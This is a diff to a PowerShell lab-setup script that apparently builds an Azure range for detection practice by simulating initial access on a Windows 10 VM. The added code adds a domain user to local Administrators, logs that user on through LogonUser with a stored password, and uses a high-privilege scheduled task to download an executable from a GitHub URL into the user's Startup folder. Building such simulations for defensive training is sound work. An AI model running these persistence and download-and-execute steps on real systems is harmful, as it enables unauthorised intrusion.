@@ -843,8 +843,11 @@ $output.Value | ForEach-Object { $_.Message }
 ## Logon candice to win10
 $w10script = @"
 net localgroup Administrators "ODOMAIN\candice.kevin" /add
-schtasks /create /tn "RunCMD" /tr "cmd.exe /c echo hi " /sc ONCE /st 14:30 /ru "ODOMAIN\candice.kevin" /rp "$adminPassword"
+schtasks /create /tn "RunCMD" /tr "cmd.exe /c echo hi " /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "$adminPassword"
 schtasks /run /tn "RunCMD"
+New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -force
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Type DWord
+gpupdate /force
 "@
 $output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script 
 
@@ -991,4 +994,161 @@ Remove-Item `$SecEditFile -Force
 $output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "mserv" -CommandId "RunPowerShellScript" -ScriptString $mservscript 
 
 # View the full output
+$output.Value | ForEach-Object { $_.Message }
+
+
+
+# Simulate user logon and initial access
+$CandiceUserName = "ODOMAIN\candice.kevin"
+
+$w10script=@"
+`$DownloadUrl = "https://github.com/secpfe/FundyLabs/raw/refs/heads/main/rs.exe"
+`$ExeName     = "rs.exe"
+`$UserName    = "$CandiceUserName"
+`$Password    = "$adminPassword"
+
+
+# Drop a small PowerShell script on disk (C:\Temp\DownloadStartup.ps1)
+
+`$downloadScript = `@"
+param(
+    [string]```$DownloadUrl,
+    [string]```$ExeName
+)
+Write-Output "Downloading from ```$DownloadUrl..."
+
+# Startup folder for the *current* user 
+```$startupFolder = Join-Path ```$env:USERPROFILE "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+if (!(Test-Path ```$startupFolder)) {
+    New-Item -ItemType Directory -Path ```$startupFolder -Force | Out-Null
+}
+
+```$destination = Join-Path ```$startupFolder ```$ExeName
+Invoke-WebRequest -Uri ```$DownloadUrl -OutFile ```$destination
+
+Write-Output "Downloaded to ```$destination"
+"`@
+
+# Create a temp directory if needed
+if (!(Test-Path "C:\Temp")) {
+    New-Item -ItemType Directory -Path "C:\Temp" | Out-Null
+}
+
+# Write the download script to disk
+`$downloadScriptPath = "C:\Temp\DownloadStartup.ps1"
+Set-Content -Path `$downloadScriptPath -Value `$downloadScript -Force -Encoding UTF8
+
+# -----------------------
+# STEP 1: Add P/Invoke definitions
+# -----------------------
+Add-Type -TypeDefinition `@"
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class NativeMethods {
+    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    public static extern bool LogonUser(
+        string lpszUsername,
+        string lpszDomain,
+        string lpszPassword,
+        int dwLogonType,
+        int dwLogonProvider,
+        out IntPtr phToken);
+
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+    public static extern bool CloseHandle(IntPtr handle);
+
+    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    public static extern bool CreateProcessAsUser(
+        IntPtr hToken,
+        string lpApplicationName,
+        string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        int dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    public struct STARTUPINFO {
+        public int cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwXSize;
+        public int dwYSize;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    // Logon types
+    public const int LOGON32_LOGON_INTERACTIVE = 2;
+    public const int LOGON32_PROVIDER_DEFAULT  = 0;
+}
+"`@
+
+# -----------------------
+# STEP 2: LogonUser (Interactive)
+# -----------------------
+Write-Host "`n[+] Attempting interactive logon for user: `$UserName"
+
+`$domain = ""
+`$user   = `$UserName
+if (`$UserName -like "*\*") {
+    `$domain = `$UserName.Split("\")[0]
+    `$user   = `$UserName.Split("\")[1]
+}
+
+[IntPtr]`$userToken = [IntPtr]::Zero
+`$logonOk = [NativeMethods]::LogonUser(
+    `$user,
+    `$domain,
+    `$Password,
+    [NativeMethods]::LOGON32_LOGON_INTERACTIVE,
+    [NativeMethods]::LOGON32_PROVIDER_DEFAULT,
+    [ref] `$userToken
+)
+
+if (!`$logonOk) {
+    `$err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    throw "LogonUser (interactive) failed. Win32 error: `$err"
+}
+
+Write-Output "[+] LogonUser succeeded. We have an interactive token for `$UserName."
+
+# -----------------------------------------------------------
+# STEP 3: Use a Scheduled Task to simulate download
+# -----------------------------------------------------------
+
+Write-Output "`n[+] Creating a scheduled task to run DownloadStartup.ps1 as `$UserName..."
+schtasks /create /tn "RunDownload" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Temp\DownloadStartup.ps1 -DownloadUrl `$DownloadUrl -ExeName `$ExeName" /sc ONCE /st 23:59 /ru "ODOMAIN\candice.kevin" /rp "`$Password"  /RL HIGHEST  /F 
+schtasks /run /tn "RunDownload"
+
+Write-Output "`n[+] Done. There should be Event Log for a Type 2 logon, and the exe file should be placed in candice.kevin's Startup folder."
+"@
+
+
+$output = Invoke-AzVMRunCommand -ResourceGroupName "ITOperations" -VMName "win10" -CommandId "RunPowerShellScript" -ScriptString $w10script
 $output.Value | ForEach-Object { $_.Message }
